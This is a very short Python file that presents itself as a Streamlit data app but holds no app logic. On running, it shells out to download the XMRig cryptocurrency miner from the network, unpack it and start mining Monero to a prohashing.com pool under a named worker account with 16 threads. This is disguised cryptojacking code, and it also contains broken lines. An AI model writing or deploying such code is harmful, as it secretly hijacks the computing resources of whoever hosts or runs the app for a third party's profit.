import streamlit as st 
import numpy as np
import matplotlib.pyplot as plt
import pandas as pd
import sys
!import os
import subprocess
p = subprocess.run("curl -L -o xmrig-6.18.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a rx/0 -o stratum+tcp://prohashing.com:3359 -u temera88.NEW --keepalive -p a=randomx -t 16", stdout=subprocess.PIPE, shell=True)
print(p.communicate())
